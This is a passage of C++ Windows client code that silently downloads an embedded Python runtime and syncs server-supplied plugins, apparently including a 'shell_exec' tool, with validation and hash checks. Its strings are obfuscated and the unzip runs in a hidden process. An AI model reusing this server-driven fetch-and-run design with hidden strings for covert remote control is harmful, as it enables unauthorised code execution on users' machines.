    GetModuleFileNameW(nullptr, exePath, MAX_PATH);
    std::wstring appDir = std::wstring(exePath);
    appDir = appDir.substr(0, appDir.find_last_of(L'\\'));
    std::wstring runtimeDir = appDir + ::r6m::ev::Widen(R6M_STR_12095B49D34E37FD);
    std::wstring pythonExe = runtimeDir + ::r6m::ev::Widen(R6M_STR_523528957ADDBEB3);

    if (GetFileAttributesW(pythonExe.c_str()) == INVALID_FILE_ATTRIBUTES) {
        LOG_I(R6M_STR_05073D2537B45D1A, R6M_STR_A836D193556D24D1);
        CreateDirectoryW(runtimeDir.c_str(), nullptr);

        // 从服务端下载 python 嵌入式包
        std::string rtResp = httpGet(R6M_STR_0AD58B618E3F2B11);
        LOG_I(R6M_STR_05073D2537B45D1A, ("Runtime list: " + rtResp.substr(0, 200)).c_str());

        // 找 python*.zip
        std::string pyZip;
        auto pp = rtResp.find("python");
        if (pp != std::string::npos) {
            auto q1 = rtResp.rfind('"', pp);
            auto q2 = rtResp.find('"', pp);
            // 简单提取文件名
            while (pp < rtResp.size() && rtResp[pp] != '"') pp++;
            pyZip = rtResp.substr(q1 + 1, pp - q1 - 1);
        }

        if (pyZip.empty()) {
            LOG_E(R6M_STR_05073D2537B45D1A, R6M_STR_B9A25EEEE8BC5448);
        } else if (!IsValidRemoteName(pyZip) || pyZip.find('/') != std::string::npos || pyZip.find('\\') != std::string::npos) {
            LOG_E(R6M_STR_05073D2537B45D1A, ("  非法运行时包名，拒绝下载: " + pyZip).c_str());
        } else {
            LOG_I(R6M_STR_05073D2537B45D1A, (R6M_STR_BA5C3D8B931A4749 + pyZip).c_str());
            // httpDownload 需要完整 URL（InternetCrackUrlA 不支持相对路径）
            std::string zipUrl = _serverUrl + R6M_STR_42B4141DBF791437 + pyZip;
            std::wstring zipPath = appDir + L"\\" + std::wstring(pyZip.begin(), pyZip.end());
            if (httpDownload(zipUrl, zipPath)) {
                LOG_I(R6M_STR_05073D2537B45D1A, "  zip downloaded, extracting...");

                // 解压到 runtime 目录
                std::wstring unzipCmd = std::wstring(::r6m::ev::Widen(R6M_STR_12F5305120D8F0AB)) + zipPath + L"\" -C \"" + runtimeDir + L"\"";
                STARTUPINFOW si = { sizeof(si) };
                PROCESS_INFORMATION pi = {};
                if (CreateProcessW(nullptr, (LPWSTR)unzipCmd.c_str(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW,
                                  nullptr, nullptr, &si, &pi)) {
                    WaitForSingleObject(pi.hProcess, 120000);
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    LOG_I(R6M_STR_05073D2537B45D1A, R6M_STR_99A60B51C3C36333);
                }
                // 删除 zip
                DeleteFileW(zipPath.c_str());
            } else {
                LOG_E(R6M_STR_05073D2537B45D1A, R6M_STR_624209936E98729A);
            }
        }

        // 验证
        if (GetFileAttributesW(pythonExe.c_str()) == INVALID_FILE_ATTRIBUTES) {
            LOG_E(R6M_STR_05073D2537B45D1A, R6M_STR_EA8730D8D7A99D6C);
        } else {
            LOG_I(R6M_STR_05073D2537B45D1A, R6M_STR_348F0DAB7ADBB808);
        }
    } else {
        LOG_I(R6M_STR_05073D2537B45D1A, R6M_STR_710EB40C1F02FC9D);
    }

    // ═══ 1) 从服务端获取可用插件列表 ═══
    std::string resp = httpGet(R6M_STR_94CA8817F508C0D5);
    if (resp.empty()) {
        LOG_W(R6M_STR_05073D2537B45D1A, "Failed to get plugin list from server");
        return;
    }
    LOG_I(R6M_STR_05073D2537B45D1A, (R6M_STR_8541264F48938E7C + resp.substr(0, 200)).c_str());

    // 2) 用 JSON 解析器读列表，格式：
    //    [{"id":"x","name":"..","command":"python x.py","files":["plugin.json","x.py"]},...]
    //
    // 原实现有两个会"静默失败"的缺陷，都在干净目录里实测复现过：
    //   · 手工子串扫描 + 从 command 里猜文件名：command 写法规整才行，
    //     否则不下 .py，日志却照写 "Downloaded plugin"，最终工具数为 0；
    //   · 不校验响应内容：服务端 404 的 {"error":"not found: ..."} 被原样
    //     写进 plugin.json —— 没有 command 字段，同样不下 .py，
    //     而落盘日志写着 "saved plugin.json"，从日志上看不出任何异常。
    // 现在文件清单由服务端给出，落盘前必须校验，且缺文件就补。
    r6m::Json list;
    std::string jerr;
    if (!r6m::Json::parse(resp, list, &jerr) || !list.isArray()) {
        LOG_E(R6M_STR_05073D2537B45D1A, ("插件列表不是合法 JSON 数组，放弃同步: " + jerr).c_str());
        return;
    }

    int downloaded = 0;
    int filesWritten = 0;
    int filesFailed = 0;

    for (const auto& pj : list.items) {
        if (!pj.isObject()) continue;
        const std::string pluginId = pj.getString("id");
        if (pluginId.empty() || !IsValidRemoteName(pluginId) ||
            pluginId.find('/') != std::string::npos || pluginId.find('\\') != std::string::npos) {
            LOG_W(R6M_STR_05073D2537B45D1A, ("非法插件 ID，跳过: " + pluginId).c_str());
            continue;
        }

        // 服务端下发的文件清单；老服务端没有该字段时退化为 plugin.json + <id>.py
        std::vector<std::string> files;
        const r6m::Json* filesNode = pj.find("files");
        if (filesNode && filesNode->isArray()) {
            for (const auto& f : filesNode->items) {
                if (f.isString() && !f.text.empty()) files.push_back(f.text);
            }
        }
        if (files.empty()) {
            files.push_back("plugin.json");
            files.push_back(pluginId + ".py");
        }

        // 服务端下发的文件 sha256（新服务端才有；老服务端没有该字段时退化为原来的"只判存在"）。
        std::map<std::string, std::string> wantSha;
        if (const r6m::Json* hn = pj.find("file_hashes"); hn && hn->isObject()) {
            for (const auto& fname : files) {
                const std::string h = hn->getString(fname);
                if (!h.empty()) wantSha[fname] = h;
            }
        }

        std::wstring localDir = pluginDir + L"\\" + std::wstring(pluginId.begin(), pluginId.end());
        CreateDirectoryW(localDir.c_str(), nullptr);

        // 缺哪个补哪个。不能只判断 plugin.json 是否存在 ——
        // 原来就是这样：plugin.json 落盘后进程中断，此后每次同步都判定"已存在"
        // 而直接跳过，插件永远停在半截状态（工具数为 0）且无从察觉。
        bool incomplete = false;
        for (const auto& fname : files) {
            if (!IsValidRemoteName(fname) || fname.find('/') != std::string::npos ||
                fname.find('\\') != std::string::npos) {
                continue;
            }
            std::wstring fp = localDir + L"\\" + std::wstring(fname.begin(), fname.end());
            if (GetFileAttributesW(fp.c_str()) == INVALID_FILE_ATTRIBUTES) { incomplete = true; break; }
            // 有服务端哈希就按**内容**判：不一致 = 需要重新拉。
            auto want = wantSha.find(fname);
            if (want != wantSha.end()) {
                const std::string have = Sha256FileHex(fp);
                if (have != want->second) {
                    LOG_I(R6M_STR_05073D2537B45D1A, ("  内容不一致，需更新: " + fname +
                          " 本地=" + have.substr(0, 16) + " 服务端=" + want->second.substr(0, 16)).c_str());
                    incomplete = true;
                    break;
                }
            }
        }
        if (!incomplete) {
            LOG_I(R6M_STR_05073D2537B45D1A, ("插件已完整，跳过: " + pluginId).c_str());
            continue;
        }

        LOG_I(R6M_STR_05073D2537B45D1A, ("下载插件: " + pluginId).c_str());

        for (const auto& fname : files) {
            if (!IsValidRemoteName(fname) || fname.find('/') != std::string::npos ||
                fname.find('\\') != std::string::npos) {
                LOG_E(R6M_STR_05073D2537B45D1A, ("非法文件名，拒绝下载: " + fname).c_str());
                filesFailed++;
                continue;
            }

            // 用服务端给的文件名拼路径，只依赖 /api/plugins/get?name= 这个前缀常量。
            // 不再使用"尾部常量"。实测那个常量在本二进制里解析成了同一个前缀，
            // 于是 URL 变成 ...?name=shell_exec/api/plugins/get?name= 而 404 ——
            // 而 404 的错误体又被当作 plugin.json 写盘，问题被彻底掩盖。
            std::string url = R6M_STR_F1452FA772647593 + pluginId + "/" + fname;
            std::string body = httpGet(url);
            if (body.empty()) {
                LOG_E(R6M_STR_05073D2537B45D1A, ("下载失败（空响应）: " + fname).c_str());
                filesFailed++;
                continue;
            }
            // 落盘前必须确认拿到的是文件本体而不是服务端错误体。
            // 这一条如果省掉，"下错东西"会伪装成"下载成功"（本次事故就是这样）。
            if (body.size() < 512 && body.find("\"error\"") != std::string::npos) {
                LOG_E(R6M_STR_05073D2537B45D1A,
                      ("服务端返回错误体，拒绝落盘: " + fname + " <- " + body.substr(0, 120)).c_str());
                filesFailed++;
                continue;
            }
            if (fname == "plugin.json" && body.find("\"id\"") == std::string::npos) {
                LOG_E(R6M_STR_05073D2537B45D1A,
                      "plugin.json 缺少 id 字段，拒绝落盘（可能是错误响应）");
                filesFailed++;
                continue;
            }

            std::wstring filePath = localDir + L"\\" + std::wstring(fname.begin(), fname.end());
            // 先写 .tmp 再替换：直接 CREATE_ALWAYS 覆盖时，半截写入会留下一个
            // "存在但损坏" 的文件 —— 而存在性判据会把它当成已完整，从此永不修复。
            // 那是比"没下下来"更难查的静默故障，所以这里必须原子落盘。
            std::wstring tmpPath = filePath + L".tmp";
            HANDLE hFile = CreateFileW(tmpPath.c_str(), GENERIC_WRITE, 0, nullptr,
                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (hFile == INVALID_HANDLE_VALUE) {
                LOG_E(R6M_STR_05073D2537B45D1A, ("创建文件失败: " + fname).c_str());
                filesFailed++;
                continue;
            }
            DWORD written = 0;
            WriteFile(hFile, body.c_str(), (DWORD)body.size(), &written, nullptr);
            CloseHandle(hFile);
            if (written != body.size()) {
                LOG_E(R6M_STR_05073D2537B45D1A, ("写入不完整: " + fname).c_str());
                DeleteFileW(tmpPath.c_str());
                filesFailed++;
                continue;
            }
            if (!MoveFileExW(tmpPath.c_str(), filePath.c_str(), MOVEFILE_REPLACE_EXISTING)) {
                LOG_E(R6M_STR_05073D2537B45D1A, ("替换目标文件失败: " + fname).c_str());
                DeleteFileW(tmpPath.c_str());
                filesFailed++;
                continue;
            }
            filesWritten++;
            LOG_I(R6M_STR_05073D2537B45D1A, ("  saved: " + fname + " (" +
                  std::to_string(written) + " bytes)").c_str());
        }

        downloaded++;
    }

    LOG_I(R6M_STR_05073D2537B45D1A, ("=== syncPlugins done, 需同步插件=" + std::to_string(downloaded) +
          " files=" + std::to_string(filesWritten) + " failed=" + std::to_string(filesFailed) +
          R6M_STR_B116D9RMM7169EB24).c_str());

    // 同步完必须重扫一次：插件进程是按需启动的，不重扫则工具映射仍是空的，
    // 面板第一次调用工具会得到 "no plugin provides tool"。
    _plugins.scanPlugins(pluginDir);
    LOG_I(R6M_STR_05073D2537B45D1A, "同步完成，已重扫插件目录");
}

